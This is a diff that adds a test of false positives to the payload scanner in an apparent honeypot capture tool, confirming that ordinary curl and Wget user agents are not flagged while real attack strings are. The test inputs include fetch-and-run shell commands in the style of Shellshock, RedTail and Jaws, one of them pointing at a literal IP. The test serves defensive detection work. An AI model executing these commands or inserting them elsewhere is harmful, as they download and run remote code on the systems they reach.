@@ -69,6 +69,45 @@ def test_header_capture() -> None:
           and prefix["body_truncated"] and prefix["content_length"] == 5000)
 
 
+def test_scanner_false_positives() -> None:
+    """Shapes from the first live day that the scanner mislabelled as payloads.
+
+    Each one put a session into the `payload` stage without any payload, so
+    the headline stage count was wrong. The true-positive twin of each case is
+    checked next to it, so a fix cannot just switch the detector off.
+    """
+    print("\nscanner false positives seen live")
+
+    def scan(path="/", query=None, headers=(), body=None):
+        b = capture.Body(body.encode(), False, len(body)) if body else None
+        return capture.scan_request(path, query, [list(h) for h in headers], b, "scannersnoop.com")
+
+    found, _ = scan(headers=[("User-Agent", "curl/8.14.1")])
+    check("curl/8.x user agent is not a downloader", not found.downloaders, str(found.downloaders))
+    found, _ = scan(headers=[("User-Agent", "Wget/1.21.4")])
+    check("Wget/1.x user agent is not a downloader", not found.downloaders, str(found.downloaders))
+    found, _ = scan(headers=[("User-Agent", "() { :; }; /usr/bin/wget http://x.test/a")])
+    check("a wget command inside a user agent still is", found.downloaders == ["wget"], str(found.downloaders))
+
+    found, _ = scan(headers=[("Signature-Agent", '"https://bot.duckduckgo.com"')])
+    check("Web Bot Auth Signature-Agent url is not a payload url", not found.urls, str(found.urls))
+
+    found, _ = scan(path="http://api.ipify.org/")
+    check("absolute-form proxy target is not a payload url", not found.urls, str(found.urls))
+    found, _ = scan(path="api.ipify.org:443")
+    check("CONNECT authority is not a payload url", not found.urls, str(found.urls))
+    found, _ = scan(path="/shell", query="cd+/tmp;wget+http://x.test/a.sh;sh+a.sh")
+    check("a url in a query is still a payload url", found.urls == ["http://x.test/a.sh"], str(found.urls))
+
+    # RedTail's body: "(wget -qO- https://h/sh || curl -sk https://h/sh) | sh"
+    found, _ = scan(body="(wget --no-check-certificate -qO- https://217.60.102.5/sh || "
+                         "curl -sk https://217.60.102.5/sh) | sh -s apache")
+    check("shell punctuation is not part of a url", found.urls == ["https://217.60.102.5/sh"], str(found.urls))
+    # Jaws: the url ends where the shell command separator starts.
+    found, _ = scan(path="/shell", query="cd+/tmp;wget+http://play.example.test/$file;chmod+777+$file")
+    check("a ; ends the url", found.urls == ["http://play.example.test/$file"], str(found.urls))
+
+
 def test_credentials() -> None:
     print("\ncredential extraction (unit)")
 
@@ -227,6 +266,7 @@ async def test_live() -> None:
 
 if __name__ == "__main__":
     test_header_capture()
+    test_scanner_false_positives()
     test_credentials()
     asyncio.run(test_live())
     print("\nFAILURES: " + ", ".join(failures) if failures else "\nall capture checks passed")
